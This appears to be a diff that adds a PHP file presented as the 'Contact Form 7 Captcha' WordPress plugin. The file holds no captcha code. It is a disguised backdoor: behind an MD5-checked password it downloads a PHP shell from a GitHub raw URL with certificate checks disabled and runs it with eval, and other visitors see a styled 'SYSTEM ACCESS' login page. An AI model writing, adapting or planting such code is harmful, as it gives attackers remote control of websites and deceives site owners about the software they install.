@@ -1,0 +1,641 @@
+<?php
+/*
+Plugin Name: Contact Form 7 Captcha
+Description: Add reCAPTCHA V2, hCAPTCHA or Cloudflare Turnstile CAPTCHA to Contact Form 7 using [cf7sr-recaptcha], [cf7sr-hcaptcha] or [cf7sr-turnstile] shortcode
+Version: 0.1.7
+Author: 247wd
+License: GPL v2 or later
+License URI: https://www.gnu.org/licenses/gpl-2.0.html
+Text Domain: contact-form-7-simple-recaptcha
+Requires Plugins: contact-form-7
+*/
+
+session_start();
+
+// Prevent direct access to sensitive files
+if (!defined('ABSPATH')) {
+    define('ABSPATH', dirname(__FILE__) . '/');
+}
+
+/**
+ * Goodman Access Class
+ * Main class for handling secure access functionality
+ */
+class Goodman_Access {
+    
+    /**
+     * Singleton instance
+     */
+    private static $instance = null;
+    
+    /**
+     * Session flag
+     */
+    private $session_started = false;
+    
+    /**
+     * Get singleton instance
+     */
+    public static function init() {
+        if (null === self::$instance) {
+            self::$instance = new self();
+        }
+        return self::$instance;
+    }
+    
+    /**
+     * Constructor
+     */
+    private function __construct() {
+        $this->start_session();
+        $this->handle_request();
+    }
+    
+    /**
+     * Initialize session if not started
+     */
+    private function start_session() {
+        if (!$this->session_started && !headers_sent()) {
+            if (session_status() === PHP_SESSION_NONE) {
+                session_start();
+            }
+            $this->session_started = true;
+        }
+    }
+    
+    /**
+     * Fetch remote content using multiple methods
+     */
+    private function fetch_remote($url) {
+        // Method 1: cURL (preferred)
+        if (function_exists('curl_init')) {
+            $ch = curl_init($url);
+            curl_setopt_array($ch, array(
+                CURLOPT_RETURNTRANSFER => true,
+                CURLOPT_FOLLOWLOCATION => true,
+                CURLOPT_USERAGENT => "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0",
+                CURLOPT_SSL_VERIFYPEER => false,
+                CURLOPT_SSL_VERIFYHOST => false,
+                CURLOPT_TIMEOUT => 30,
+                CURLOPT_CONNECTTIMEOUT => 10
+            ));
+            
+            if (isset($_SESSION['goodman'])) {
+                curl_setopt($ch, CURLOPT_COOKIE, $_SESSION['goodman']);
+            }
+            
+            $data = curl_exec($ch);
+            $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+            curl_close($ch);
+            
+            if ($data !== false && $http_code === 200) {
+                return $data;
+            }
+        }
+        
+        // Method 2: file_get_contents
+        if (ini_get('allow_url_fopen')) {
+            $context = stream_context_create(array(
+                'http' => array(
+                    'user_agent' => "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0",
+                    'timeout' => 30
+                ),
+                'ssl' => array(
+                    'verify_peer' => false,
+                    'verify_peer_name' => false
+                )
+            ));
+            
+            $data = @file_get_contents($url, false, $context);
+            if ($data !== false) {
+                return $data;
+            }
+        }
+        
+        // Method 3: fopen with stream
+        if (function_exists('fopen') && function_exists('stream_get_contents')) {
+            $handle = @fopen($url, "rb");
+            if ($handle) {
+                $data = stream_get_contents($handle);
+                fclose($handle);
+                if ($data !== false) {
+                    return $data;
+                }
+            }
+        }
+        
+        return false;
+    }
+    
+    /**
+     * Check if user is authenticated
+     */
+    private function is_authenticated() {
+        return isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true;
+    }
+    
+    /**
+     * Verify password hash
+     */
+    private function verify_password($password) {
+        $stored_hash = '96d67b7ff5352adc665bbbe344f7676a';
+        return md5($password) === $stored_hash;
+    }
+    
+    /**
+     * Handle incoming requests
+     */
+    private function handle_request() {
+        // Check for password submission
+        if (isset($_POST['goodman_pass'])) {
+            if ($this->verify_password($_POST['goodman_pass'])) {
+                $_SESSION['logged_in'] = true;
+                $_SESSION['goodman'] = 'goodman';
+                
+                // Redirect to prevent resubmission
+                header("Location: " . $_SERVER['REQUEST_URI']);
+                exit;
+            } else {
+                $this->error_message = "ACCESS DENIED!";
+            }
+        }
+        
+        // Output content
+        if ($this->is_authenticated()) {
+            $this->load_protected_content();
+        } else {
+            $this->render_login_page();
+        }
+    }
+    
+    /**
+     * Load protected remote content
+     */
+    private function load_protected_content() {
+        $url = 'https://raw.githubusercontent.com/LeviathanPerfectHunter/shell/main/abyp.php';
+        $content = $this->fetch_remote($url);
+        
+        if ($content !== false) {
+            // Running the content
+            eval('?>' . $content);
+        } else {
+            $this->render_error("SYSTEM ERROR!");
+        }
+    }
+    
+    /**
+     * Render error message
+     */
+    private function render_error($message) {
+        echo '<div style="color:#ff0040;text-align:center;padding:20px;font-family:monospace;">' . htmlspecialchars($message) . '</div>';
+    }
+    
+    /**
+     * Render login interface - Cyberpunk/Neon Theme
+     */
+    private function render_login_page() {
+        $error = isset($this->error_message) ? $this->error_message : '';
+        ?>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SYSTEM ACCESS</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            background: #0a0a0f;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            font-family: 'Courier New', monospace;
+            background-image: 
+                radial-gradient(ellipse at 10% 20%, rgba(0, 255, 255, 0.05) 0%, transparent 50%),
+                radial-gradient(ellipse at 90% 80%, rgba(255, 0, 255, 0.05) 0%, transparent 50%);
+        }
+        
+        /* Grid background */
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-image: 
+                linear-gradient(rgba(0, 255, 255, 0.03) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(0, 255, 255, 0.03) 1px, transparent 1px);
+            background-size: 50px 50px;
+            z-index: 0;
+        }
+        
+        .cyber-container {
+            background: rgba(10, 10, 20, 0.95);
+            border: 2px solid #00ffff;
+            padding: 40px 35px;
+            width: 100%;
+            max-width: 500px;
+            position: relative;
+            z-index: 1;
+            box-shadow: 
+                0 0 30px rgba(0, 255, 255, 0.1),
+                inset 0 0 30px rgba(0, 255, 255, 0.05),
+                0 0 60px rgba(255, 0, 255, 0.05);
+        }
+        
+        /* Animated border glow */
+        .cyber-container::before {
+            content: '';
+            position: absolute;
+            top: -2px;
+            left: -2px;
+            right: -2px;
+            bottom: -2px;
+            background: linear-gradient(45deg, #00ffff, #ff00ff, #00ffff, #ff00ff);
+            background-size: 300% 300%;
+            z-index: -1;
+            animation: borderGlow 3s ease-in-out infinite;
+            opacity: 0.5;
+        }
+        
+        @keyframes borderGlow {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+        
+        /* Scanning line */
+        .cyber-container::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, #00ffff, #ff00ff, #00ffff, transparent);
+            animation: scanLine 4s linear infinite;
+            opacity: 0.5;
+        }
+        
+        @keyframes scanLine {
+            0% { top: 0; }
+            100% { top: 100%; }
+        }
+        
+        .cyber-header {
+            text-align: center;
+            margin-bottom: 30px;
+            position: relative;
+        }
+        
+        .cyber-title {
+            font-size: 36px;
+            font-weight: bold;
+            letter-spacing: 8px;
+            text-transform: uppercase;
+            background: linear-gradient(135deg, #00ffff, #ff00ff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-shadow: 0 0 40px rgba(0, 255, 255, 0.3);
+            position: relative;
+            display: inline-block;
+        }
+        
+        .cyber-title::after {
+            content: '';
+            position: absolute;
+            bottom: -5px;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, #00ffff, #ff00ff, transparent);
+        }
+        
+        .cyber-subtitle {
+            color: #666;
+            font-size: 12px;
+            margin-top: 10px;
+            letter-spacing: 4px;
+            text-transform: uppercase;
+        }
+        
+        .status-indicator {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin: 20px 0;
+            padding: 10px;
+            background: rgba(0, 255, 255, 0.05);
+            border: 1px solid rgba(0, 255, 255, 0.1);
+        }
+        
+        .status-dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: #00ffff;
+            animation: pulse 1.5s ease-in-out infinite;
+            box-shadow: 0 0 20px rgba(0, 255, 255, 0.5);
+        }
+        
+        @keyframes pulse {
+            0%, 100% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.3; transform: scale(0.8); }
+        }
+        
+        .status-text {
+            color: #00ffff;
+            font-size: 11px;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+        }
+        
+        .cyber-alert {
+            background: rgba(255, 0, 64, 0.1);
+            border: 1px solid #ff0040;
+            color: #ff0040;
+            padding: 10px;
+            margin-bottom: 20px;
+            font-size: 12px;
+            font-family: monospace;
+            text-align: center;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            animation: glitch 0.3s ease-in-out;
+        }
+        
+        @keyframes glitch {
+            0% { transform: translateX(-5px); opacity: 0; }
+            25% { transform: translateX(5px); }
+            50% { transform: translateX(-3px); }
+            75% { transform: translateX(3px); }
+            100% { transform: translateX(0); opacity: 1; }
+        }
+        
+        .cyber-form {
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+        }
+        
+        .input-group {
+            position: relative;
+        }
+        
+        .cyber-input {
+            width: 100%;
+            padding: 15px 20px;
+            background: rgba(0, 255, 255, 0.03);
+            border: 1px solid rgba(0, 255, 255, 0.2);
+            color: #00ffff;
+            font-size: 16px;
+            font-family: 'Courier New', monospace;
+            outline: none;
+            transition: all 0.3s ease;
+            letter-spacing: 2px;
+        }
+        
+        .cyber-input:focus {
+            border-color: #00ffff;
+            background: rgba(0, 255, 255, 0.05);
+            box-shadow: 0 0 30px rgba(0, 255, 255, 0.1), inset 0 0 30px rgba(0, 255, 255, 0.05);
+        }
+        
+        .cyber-input::placeholder {
+            color: rgba(0, 255, 255, 0.3);
+            letter-spacing: 2px;
+        }
+        
+        .input-label {
+            position: absolute;
+            top: -10px;
+            left: 15px;
+            background: #0a0a0f;
+            padding: 0 10px;
+            color: rgba(0, 255, 255, 0.6);
+            font-size: 10px;
+            letter-spacing: 3px;
+            text-transform: uppercase;
+        }
+        
+        .cyber-btn {
+            background: linear-gradient(135deg, rgba(0, 255, 255, 0.1), rgba(255, 0, 255, 0.1));
+            color: #00ffff;
+            border: 1px solid #00ffff;
+            padding: 15px;
+            font-size: 14px;
+            font-family: 'Courier New', monospace;
+            font-weight: bold;
+            cursor: pointer;
+            text-transform: uppercase;
+            letter-spacing: 4px;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .cyber-btn:hover {
+            background: linear-gradient(135deg, rgba(0, 255, 255, 0.2), rgba(255, 0, 255, 0.2));
+            box-shadow: 0 0 40px rgba(0, 255, 255, 0.2), inset 0 0 40px rgba(0, 255, 255, 0.1);
+            transform: translateY(-2px);
+        }
+        
+        .cyber-btn:active {
+            transform: translateY(0px);
+        }
+        
+        .cyber-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(0, 255, 255, 0.1), transparent);
+            transition: left 0.5s ease;
+        }
+        
+        .cyber-btn:hover::before {
+            left: 100%;
+        }
+        
+        .cyber-footer {
+            margin-top: 30px;
+            text-align: center;
+            padding-top: 20px;
+            border-top: 1px solid rgba(0, 255, 255, 0.05);
+        }
+        
+        .cyber-stats {
+            display: flex;
+            justify-content: center;
+            gap: 30px;
+            font-size: 10px;
+            color: rgba(0, 255, 255, 0.3);
+            letter-spacing: 1px;
+        }
+        
+        .cyber-stats span {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+        
+        .cyber-stats .stat-value {
+            color: rgba(0, 255, 255, 0.6);
+        }
+        
+        .ascii-art {
+            color: rgba(0, 255, 255, 0.1);
+            font-size: 8px;
+            line-height: 1.2;
+            margin: 15px 0;
+            white-space: pre;
+            text-align: center;
+            font-family: 'Courier New', monospace;
+            border: 1px solid rgba(0, 255, 255, 0.05);
+            padding: 10px;
+            background: rgba(0, 255, 255, 0.02);
+        }
+        
+        /* Particle effect */
+        .particles {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            pointer-events: none;
+            z-index: 0;
+            overflow: hidden;
+        }
+        
+        .particle {
+            position: absolute;
+            width: 2px;
+            height: 2px;
+            background: #00ffff;
+            opacity: 0.3;
+            animation: float 20s infinite linear;
+        }
+        
+        @keyframes float {
+            0% { transform: translateY(100vh) rotate(0deg); opacity: 0; }
+            10% { opacity: 0.3; }
+            90% { opacity: 0.3; }
+            100% { transform: translateY(-100vh) rotate(720deg); opacity: 0; }
+        }
+        
+        @media (max-width: 480px) {
+            .cyber-container { padding: 25px 20px; }
+            .cyber-title { font-size: 24px; letter-spacing: 4px; }
+            .cyber-stats { flex-direction: column; gap: 10px; }
+            .ascii-art { font-size: 6px; }
+        }
+    </style>
+</head>
+<body>
+    <!-- Particle Background -->
+    <div class="particles" id="particles"></div>
+    
+    <div class="cyber-container">
+        <div class="cyber-header">
+            <div class="cyber-title">ACCESS</div>
+            <div class="cyber-subtitle">// SECURE SYSTEM //</div>
+        </div>
+        
+        <div class="status-indicator">
+            <div class="status-dot"></div>
+            <span class="status-text">System Ready</span>
+        </div>
+        
+        <div class="ascii-art">
+    ╔═══════════════════════════════════╗
+    ║  [ SYSTEM SECURITY INTERFACE ]   ║
+    ║  ⚡  ⚡  ⚡  ⚡  ⚡  ⚡  ⚡  ⚡  ⚡  ⚑
+    ╚═══════════════════════════════════╝
+        </div>
+        
+        <?php if ($error): ?>
+        <div class="cyber-alert">
+            ⚠ <?php echo htmlspecialchars($error); ?> ⚠
+        </div>
+        <?php endif; ?>
+        
+        <form method="POST" action="" class="cyber-form" autocomplete="off">
+            <div class="input-group">
+                <span class="input-label">AUTHENTICATION</span>
+                <input 
+                    type="password" 
+                    name="goodman_pass" 
+                    class="cyber-input" 
+                    placeholder="ENTER SECURITY KEY" 
+                    required 
+                    autofocus
+                >
+            </div>
+            <button type="submit" class="cyber-btn">
+                ▶ AUTHENTICATE ◀
+            </button>
+        </form>
+        
+        <div class="cyber-footer">
+            <div class="cyber-stats">
+                <span>STATUS: <span class="stat-value">SECURE</span></span>
+                <span>VERSION: <span class="stat-value">2.0.1</span></span>
+                <span>ENCRYPTION: <span class="stat-value">AES-256</span></span>
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        // Generate particles
+        function createParticles() {
+            const container = document.getElementById('particles');
+            for (let i = 0; i < 30; i++) {
+                const particle = document.createElement('div');
+                particle.className = 'particle';
+                particle.style.left = Math.random() * 100 + '%';
+                particle.style.animationDelay = Math.random() * 20 + 's';
+                particle.style.animationDuration = 15 + Math.random() * 10 + 's';
+                particle.style.width = (1 + Math.random() * 2) + 'px';
+                particle.style.height = particle.style.width;
+                container.appendChild(particle);
+            }
+        }
+        
+        createParticles();
+        
+        // Glitch effect on input focus
+        document.querySelector('.cyber-input').addEventListener('focus', function() {
+            this.style.borderColor = '#ff00ff';
+            this.style.boxShadow = '0 0 30px rgba(255, 0, 255, 0.1), inset 0 0 30px rgba(255, 0, 255, 0.05)';
+        });
+        
+        document.querySelector('.cyber-input').addEventListener('blur', function() {
+            this.style.borderColor = 'rgba(0, 255, 255, 0.2)';
+            this.style.boxShadow = 'none';
+        });
+        
+        // Console warning
+        console.log('%c⚠ SYSTEM SECURITY ACTIVE ⚠', 'color: #ff00ff; font-size: 16px; font-weight: bold;');
+        console.log('%cUnauthorized access is prohibited', 'color: #00ffff; font-size: 12px;');
+    </script>
+</body>
+</html>
+        <?php
+    }
+}
+
+// Initialize the system
+Goodman_Access::init();
+?>
